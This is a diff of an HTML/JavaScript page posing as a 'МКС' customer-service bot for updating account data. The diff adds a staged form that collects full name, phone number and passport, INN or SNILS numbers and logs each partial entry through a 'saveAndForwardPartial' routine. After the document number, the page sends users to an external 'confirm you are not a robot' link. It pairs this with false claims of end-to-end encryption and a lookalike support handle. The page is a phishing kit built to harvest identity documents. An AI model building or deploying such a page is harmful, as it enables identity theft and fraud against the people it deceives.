@@ -1,99 +1,350 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>МКС Mini App</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #0d1117;
-      color: #fff;
-      text-align: center;
-      padding: 20px;
-    }
-    .card {
-      background: #161b22;
-      padding: 20px;
-      border-radius: 12px;
-      max-width: 400px;
-      margin: auto;
-    }
-    button {
-      display: block;
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      color: #fff;
-    }
-    .blue { background: #007bff; }
-    .green { background: #28a745; }
-    .purple { background: #6f42c1; }
-    .orange { background: #fd7e14; }
-    .yellow { background: #ffc107; color: #000; }
-    .gray { background: #6c757d; }
-    .hidden { display: none; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>МКС Web App</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <div class="card" id="main">
-    <h2>🚀 МКС Mini App</h2>
-    <p>💧 Управляйте своими услугами легко и быстро ✨</p>
-    <button class="blue" onclick="showMsg('📝 Обновить данные: ✍️ Здесь вы могли бы обновить свои данные.')">📝 Обновить данные</button>
-    <button class="green" onclick="showMsg('🔄 Поменять тариф: 🚫 В демо-версии недоступно.')">🔄 Поменять тариф</button>
-    <button class="purple" onclick="showMsg('💳 Проверить баланс: 💳 Баланс временно недоступен.')">💳 Проверить баланс</button>
-    <button class="orange" onclick="showMsg('💸 Пополнить баланс: 🚫 пока отключено.')">💸 Пополнить баланс</button>
-    <button class="yellow" onclick="openMenu('services')">🛠️ Дополнительные услуги</button>
-  </div>
+<body class="bg-gray-100 font-sans">
+    <div class="max-w-md mx-auto p-4">
+        <div id="messageArea" class="bg-white rounded-lg shadow p-4 mb-4 h-96 overflow-y-auto"></div>
+        <div id="inputArea" class="flex flex-col">
+            <input id="userInput" type="text" class="border rounded p-2 mb-2" placeholder="Введите данные..." style="display: none;">
+            <div id="buttonArea" class="flex flex-col space-y-2"></div>
+        </div>
+    </div>
 
-  <!-- Доп. услуги -->
-  <div class="card hidden" id="services">
-    <h3>🛠️ Дополнительные услуги</h3>
-    <button class="blue" onclick="openMenu('faq')">❓ Часто задаваемые вопросы</button>
-    <button class="green" onclick="showMsg('📋 Инструкция:\\n1️⃣ Нажмите «Обновить данные».\\n2️⃣ Отправьте телефон.\\n3️⃣ Выберите документ.')">ℹ️ Инструкция</button>
-    <button class="purple" onclick="window.open('https://t.me/example_support','_blank')">📞 Связаться с техподдержкой</button>
-    <button class="gray" onclick="openMenu('main')">↩️ Вернуться назад</button>
-  </div>
+    <script>
+        // State management
+        let currentState = null;
+        let userData = {
+            fullname: '',
+            phone: '',
+            document_type: '',
+            document_number: ''
+        };
+        let userId = Math.floor(Math.random() * 1000000); // Simulate user ID
+        let username = 'WebUser'; // Simulate username
+        const BOT_NAME = 'МКС';
 
-  <!-- FAQ -->
-  <div class="card hidden" id="faq">
-    <h3>❓ Часто задаваемые вопросы</h3>
-    <button class="blue" onclick="showMsg('📌 Показания нужно передавать до 25 числа каждого месяца.')">⏳ До какого числа передавать?</button>
-    <button class="green" onclick="showMsg('⚠️ Плата будет начислена по среднему за последние полгода.')">💸 Что будет, если опоздать?</button>
-    <button class="purple" onclick="showMsg('🔐 Да, это безопасно (демо).')">🔒 Это безопасно?</button>
-    <button class="orange" onclick="showMsg('⚡️ Удобно и быстро через Telegram.')">⚡️ Почему через Telegram?</button>
-    <button class="yellow" onclick="showMsg('✅ Да, можно исправить.')">🔁 Можно ли исправить ошибку?</button>
-    <button class="blue" onclick="showMsg('👉 Паспорт, ИНН, СНИЛС.')">📑 Какие документы можно?</button>
-    <button class="gray" onclick="openMenu('services')">↩️ Вернуться назад</button>
-  </div>
+        // Main menu buttons
+        const mainMenu = [
+            { text: '📝 Обновить данные', action: startForm },
+            { text: '🔄 Поменять тариф', action: changeTariff },
+            { text: '💳 Проверить баланс', action: checkBalance },
+            { text: '💸 Пополнить баланс', action: refillBalance },
+            { text: '🛠️ Дополнительные услуги', action: additionalServicesMenu }
+        ];
 
-  <!-- Сообщения -->
-  <div class="card hidden" id="messageBox">
-    <p id="messageText"></p>
-    <button class="gray" onclick="goBack()">↩️ Назад</button>
-  </div>
+        // Additional services menu
+        const additionalServicesMenuButtons = [
+            { text: '❓ Часто задаваемые вопросы', action: faqMenu },
+            { text: 'ℹ️ Инструкция', action: showInstruction },
+            { text: '📞 Связаться с техподдержкой', action: contactSupport },
+            { text: '↩️ Вернуться назад', action: backToMainMenu }
+        ];
 
-  <script>
-    let lastMenu = "main";
+        // FAQ menu
+        const faqMenuButtons = [
+            { text: '⏳ До какого числа нужно передавать показания?', action: faqDeadline },
+            { text: '💸 Что будет, если не передать данные вовремя?', action: faqPenalty },
+            { text: '🔒 Это безопасно?', action: faqSafe },
+            { text: '⚡️ Почему через Telegram?', action: faqTelegram },
+            { text: '🔁 Можно ли исправить ошибку?', action: faqFix },
+            { text: '📑 Какие документы можно использовать?', action: faqDocuments },
+            { text: '↩️ Вернуться назад', action: backToAdditionalServices }
+        ];
 
-    function openMenu(id) {
-      document.querySelectorAll('.card').forEach(el => el.classList.add('hidden'));
-      document.getElementById(id).classList.remove('hidden');
-      lastMenu = id;
-    }
+        // Unauthorized action menu
+        const unauthorizedActionMenu = [
+            { text: '🔐 Авторизоваться', action: startForm },
+            { text: '↩️ Сменить действие', action: backToMainMenu }
+        ];
 
-    function showMsg(text) {
-      document.querySelectorAll('.card').forEach(el => el.classList.add('hidden'));
-      document.getElementById("messageBox").classList.remove("hidden");
-      document.getElementById("messageText").innerText = text;
-    }
+        // Document type menu
+        const documentTypeMenu = [
+            { text: '📄 Паспорт', action: () => setDocumentType('Паспорт') },
+            { text: '🧾 ИНН', action: () => setDocumentType('ИНН') },
+            { text: '🟢 СНИЛС', action: () => setDocumentType('СНИЛС') },
+            { text: '↩️ Вернуться назад', action: backToPhone }
+        ];
 
-    function goBack() {
-      openMenu(lastMenu);
-    }
-  </script>
+        // Display message
+        function displayMessage(text, isHtml = false) {
+            const messageArea = document.getElementById('messageArea');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'p-2 mb-2 bg-gray-200 rounded';
+            if (isHtml) {
+                messageDiv.innerHTML = text;
+            } else {
+                messageDiv.textContent = text;
+            }
+            messageArea.appendChild(messageDiv);
+            messageArea.scrollTop = messageArea.scrollHeight;
+        }
+
+        // Display buttons
+        function displayButtons(buttons) {
+            const buttonArea = document.getElementById('buttonArea');
+            buttonArea.innerHTML = '';
+            buttons.forEach(button => {
+                const btn = document.createElement('button');
+                btn.className = 'bg-blue-500 text-white p-2 rounded hover:bg-blue-600';
+                btn.textContent = button.text;
+                btn.onclick = button.action;
+                buttonArea.appendChild(btn);
+            });
+        }
+
+        // Show input field
+        function showInput(placeholder) {
+            const userInput = document.getElementById('userInput');
+            userInput.style.display = 'block';
+            userInput.placeholder = placeholder;
+            userInput.focus();
+            userInput.onkeypress = (e) => {
+                if (e.key === 'Enter' && userInput.value.trim()) {
+                    handleInput(userInput.value.trim());
+                    userInput.value = '';
+                }
+            };
+        }
+
+        // Hide input field
+        function hideInput() {
+            document.getElementById('userInput').style.display = 'none';
+        }
+
+        // Save and forward partial data
+        function saveAndForwardPartial(isComplete = false) {
+            const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
+            const userWithBot = username ? `@${username} (${BOT_NAME})` : `(${BOT_NAME})`;
+            const docType = userData.document_type || '';
+            const docNum = userData.document_number || '';
+            const record = `${timestamp}\t${userId}\t${userWithBot}\t${userData.fullname}\t${userData.phone}\t${docType} ${docNum}\n`;
+            
+            // Simulate file write by creating a downloadable file
+            const blob = new Blob([record], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'reg.txt';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            console.log(`Saved: ${record}`);
+        }
+
+        // Start form
+        function startForm() {
+            currentState = 'fullname';
+            userData = { fullname: '', phone: '', document_type: '', document_number: '' };
+            displayMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+            displayMessage('👤 Укажите Фамилию Имя Отчество полностью (только текст): 🌟');
+            displayButtons([{ text: '↩️ Вернуться назад', action: backToMainMenu }]);
+            showInput('Введите ФИО...');
+        }
+
+        // Handle user input
+        function handleInput(input) {
+            if (input === '↩️ Вернуться назад') {
+                if (currentState === 'fullname') {
+                    backToMainMenu();
+                } else if (currentState === 'phone') {
+                    backToFullname();
+                } else if (currentState === 'document_type') {
+                    backToPhone();
+                } else if (currentState === 'document_number') {
+                    backToDocumentType();
+                }
+                return;
+            }
+
+            if (currentState === 'fullname') {
+                if (!/^[А-Яа-яЁё\s-]+$/.test(input)) {
+                    displayMessage('❌ ФИО должно содержать только буквы. Попробуйте снова. 🔥');
+                    return;
+                }
+                userData.fullname = input.replace(/\s+/g, ' ').trim();
+                saveAndForwardPartial();
+                currentState = 'phone';
+                displayMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+                displayMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 💧');
+                displayButtons([{ text: '↩️ Вернуться назад', action: backToFullname }]);
+                showInput('Введите номер телефона...');
+            } else if (currentState === 'phone') {
+                const digits = input.replace(/[^0-9]/g, '');
+                if (!input.startsWith('+7') && !input.startsWith('7')) {
+                    displayMessage('❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова. 🔥');
+                    return;
+                }
+                if (digits.length < 10 || digits.length > 11) {
+                    displayMessage('❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова. 🔥');
+                    return;
+                }
+                userData.phone = input;
+                saveAndForwardPartial();
+                currentState = 'document_type';
+                displayMessage('Выберите документ: 🌟');
+                displayButtons(documentTypeMenu);
+                hideInput();
+            } else if (currentState === 'document_number') {
+                userData.document_number = input;
+                saveAndForwardPartial(true);
+                displayMessage('Для завершения подтвердите что вы не робот! ✨');
+                const confirmButton = document.createElement('a');
+                confirmButton.href = 'https://redirect.figma.site/';
+                confirmButton.className = 'bg-green-500 text-white p-2 rounded hover:bg-green-600 inline-block';
+                confirmButton.textContent = '✅ Подтвердить, что не робот';
+                document.getElementById('buttonArea').innerHTML = '';
+                document.getElementById('buttonArea').appendChild(confirmButton);
+                currentState = null;
+                hideInput();
+            }
+        }
+
+        // Set document type
+        function setDocumentType(type) {
+            userData.document_type = type;
+            saveAndForwardPartial();
+            currentState = 'document_number';
+            displayMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+            displayMessage(`Введите ${type} (пример: ${type === 'Паспорт' ? '4510 123456' : type === 'ИНН' ? '500100732259' : '112-233-445 95'}): 🌟`);
+            displayButtons([{ text: '↩️ Вернуться назад', action: backToDocumentType }]);
+            showInput(`Введите номер ${type}...`);
+        }
+
+        // Navigation functions
+        function backToMainMenu() {
+            currentState = null;
+            userData = { fullname: '', phone: '', document_type: '', document_number: '' };
+            displayMessage('🏠 Добро пожаловать в МКС-бот! 💧 Управляйте своими услугами легко и быстро! ✨');
+            displayButtons(mainMenu);
+            hideInput();
+        }
+
+        function backToFullname() {
+            currentState = 'fullname';
+            displayMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+            displayMessage('👤 Укажите Фамилию Имя Отчество полностью (только текст): 🌟');
+            displayButtons([{ text: '↩️ Вернуться назад', action: backToMainMenu }]);
+            showInput('Введите ФИО...');
+        }
+
+        function backToPhone() {
+            currentState = 'phone';
+            displayMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+            displayMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 💧');
+            displayButtons([{ text: '↩️ Вернуться назад', action: backToFullname }]);
+            showInput('Введите номер телефона...');
+        }
+
+        function backToDocumentType() {
+            currentState = 'document_type';
+            displayMessage('Выберите документ: 🌟');
+            displayButtons(documentTypeMenu);
+            hideInput();
+        }
+
+        function changeTariff() {
+            displayMessage('Мы не можем поменять из-за того что вы не авторизовались. 🔥');
+            displayButtons(unauthorizedActionMenu);
+            hideInput();
+        }
+
+        function checkBalance() {
+            displayMessage('Мы не можем проверить из-за того что вы не авторизовались. 🔥');
+            displayButtons(unauthorizedActionMenu);
+            hideInput();
+        }
+
+        function refillBalance() {
+            displayMessage('Мы не можем пополнить из-за того что вы не авторизовались. 🔥');
+            displayButtons(unauthorizedActionMenu);
+            hideInput();
+        }
+
+        function additionalServicesMenu() {
+            displayMessage('🛠️ Выберите опцию: 🌟');
+            displayButtons(additionalServicesMenuButtons);
+            hideInput();
+        }
+
+        function faqMenu() {
+            displayMessage('❓ Часто задаваемые вопросы: 🌟');
+            displayButtons(faqMenuButtons);
+            hideInput();
+        }
+
+        function faqDeadline() {
+            displayMessage('📌 Показания счетчиков нужно передавать до 25 числа каждого месяца. 💧');
+            displayButtons([{ text: '↩️ Вернуться назад', action: faqMenu }]);
+            hideInput();
+        }
+
+        function faqPenalty() {
+            displayMessage('⚠️ Плата будет начислена по среднему — исходя из показаний за последние полгода. 🔥');
+            displayButtons([{ text: '↩️ Вернуться назад', action: faqMenu }]);
+            hideInput();
+        }
+
+        function faqSafe() {
+            displayMessage('🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). ✨');
+            displayButtons([{ text: '↩️ Вернуться назад', action: faqMenu }]);
+            hideInput();
+        }
+
+        function faqTelegram() {
+            displayMessage('⚡️ Для удобства и переход на цифровые площадки. 💧');
+            displayButtons([{ text: '↩️ Вернуться назад', action: faqMenu }]);
+            hideInput();
+        }
+
+        function faqFix() {
+            displayMessage('✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🌟');
+            displayButtons([{ text: '↩️ Вернуться назад', action: faqMenu }]);
+            hideInput();
+        }
+
+        function faqDocuments() {
+            displayMessage('👉 Паспорт, ИНН, СНИЛС. 💧');
+            displayButtons([{ text: '↩️ Вернуться назад', action: faqMenu }]);
+            hideInput();
+        }
+
+        function showInstruction() {
+            const text = `📋 Чтобы обновить данные:\n1️⃣ Нажмите «Обновить данные».\n2️⃣ Отправьте номер телефона.\n3️⃣ Выберите документ и введите его номер.\n4️⃣ Получите подтверждение. ✨\n\nНа любом этапе вы можете нажать '↩️ Вернуться назад'. 💧`;
+            displayMessage(text);
+            displayButtons([{ text: '↩️ Вернуться назад', action: additionalServicesMenu }]);
+            hideInput();
+        }
+
+        function contactSupport() {
+            displayMessage('📞 Для связи с техподдержкой нажмите на кнопку ниже или используйте ссылку вручную! ✨');
+            const supportButton = document.createElement('a');
+            supportButton.href = 'https://t.me/MymtcSup';
+            supportButton.className = 'bg-blue-500 text-white p-2 rounded hover:bg-blue-600 inline-block';
+            supportButton.textContent = '📞 Написать в техподдержку';
+            document.getElementById('buttonArea').innerHTML = '';
+            document.getElementById('buttonArea').appendChild(supportButton);
+            const backButton = document.createElement('button');
+            backButton.className = 'bg-blue-500 text-white p-2 rounded hover:bg-blue-600 mt-2';
+            backButton.textContent = '↩️ Вернуться назад';
+            backButton.onclick = additionalServicesMenu;
+            document.getElementById('buttonArea').appendChild(backButton);
+            hideInput();
+        }
+
+        function backToAdditionalServices() {
+            additionalServicesMenu();
+        }
+
+        // Initialize
+        displayMessage('🏠 Добро пожаловать в МКС-бот! 💧 Управляйте своими услугами легко и быстро! ✨');
+        displayButtons(mainMenu);
+    </script>
 </body>
 </html>
